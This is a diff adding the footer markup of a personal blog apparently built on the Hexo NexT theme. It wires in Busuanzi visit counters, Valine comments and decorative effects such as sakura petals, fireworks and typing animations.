+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    已经有<span id="busuanzi_value_site_pv"></span>人摘了影影种的花</span>
+    <span class="post-meta-divider"> </span>
+    其中<span id="busuanzi_value_site_uv"></span>人不留痕迹地跑了</span>
+    <span class="post-meta-divider"> </span>
+
+
+
+
+
+<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://z4a.net/images/2022/05/31/image649ac1128183cf97.png"align="absmiddle" width="59px" height="30px" /></a>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'vcFyBSklL05djh0SlQ0i9Idk-gzGzoHsz',
+      appKey     : 'wFXz2jiwl2Jo3Q5LWDFdhUsv',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
+
+
+<script src="/js/cursor.js"></script>
+
+<script type="text/javascript">
+//只在桌面版网页启用特效
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
